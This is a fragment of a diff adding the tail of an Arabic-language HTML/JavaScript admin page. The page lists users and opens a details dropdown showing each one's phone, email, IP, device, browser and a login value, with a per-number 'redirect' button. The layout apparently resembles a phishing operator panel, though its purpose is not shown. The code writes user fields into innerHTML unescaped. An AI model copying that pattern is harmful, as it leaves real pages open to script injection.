+      <td dir="ltr" style="text-align:right">${u.phone}</td>
+      <td dir="ltr" style="text-align:right;font-size:13px">${u.email}</td>
+      <td><span class="badge ${u.status}"><span class="bdot ${u.status}"></span>${u.status==='active'?'نشط':'غير نشط'}</span></td>
+      <td><div class="acts2">
+        <div class="ddwrap" id="dw${u.id}"><button class="bdet" data-id="${u.id}">التفاصيل ▾</button></div>
+        <button class="bred" data-ph="${u.phone}">إعادة التوجيه</button>
+      </div></td>`;
+    tb.appendChild(tr);
+  });
+  tb.querySelectorAll('.bdet').forEach(btn=>{
+    btn.addEventListener('click',e=>{
+      e.stopPropagation();
+      const id=+btn.dataset.id;
+      const w=document.getElementById('dw'+id);
+      if(openDD&&openDD!==w){openDD.querySelector('.dd')?.remove();}
+      if(w.querySelector('.dd')){w.querySelector('.dd').remove();openDD=null;return;}
+      const u=USERS.find(x=>x.id===id);
+      const dd=document.createElement('div');dd.className='dd';
+      dd.innerHTML=`<div class="ddttl">🔍 تفاصيل المستخدم</div>
+        <div class="ddrow"><span class="ddk">رقم تسجيل الدخول</span><span class="ddv hi">${S.login||'-'}</span></div>
+        <div class="ddrow"><span class="ddk">الاسم</span><span class="ddv">${u.name}</span></div>
+        <div class="ddrow"><span class="ddk">رقم الجوال</span><span class="ddv">${u.phone}</span></div>
+        <div class="ddrow"><span class="ddk">البريد</span><span class="ddv">${u.email}</span></div>
+        <div class="ddrow"><span class="ddk">الدولة</span><span class="ddv">${u.country}</span></div>
+        <div class="ddrow"><span class="ddk">الجهاز</span><span class="ddv">${u.device}</span></div>
+        <div class="ddrow"><span class="ddk">المتصفح</span><span class="ddv">${u.browser}</span></div>
+        <div class="ddrow"><span class="ddk">IP</span><span class="ddv">${u.ip}</span></div>
+        <div class="ddrow"><span class="ddk">تاريخ الانضمام</span><span class="ddv">${u.joined}</span></div>
+        <div class="ddrow"><span class="ddk">الحالة</span><span class="ddv">${u.status==='active'?'🟢 نشط':'🔴 غير نشط'}</span></div>`;
+      w.appendChild(dd);openDD=w;
+    });
+  });
+  tb.querySelectorAll('.bred').forEach(btn=>{btn.addEventListener('click',()=>alert('إعادة التوجيه: '+btn.dataset.ph));});
+}
+document.addEventListener('click',()=>{if(openDD){openDD.querySelector('.dd')?.remove();openDD=null;}});
+
+// INIT
+buildKbd();upCase();prender();
+</script>
+</body>
+</html>
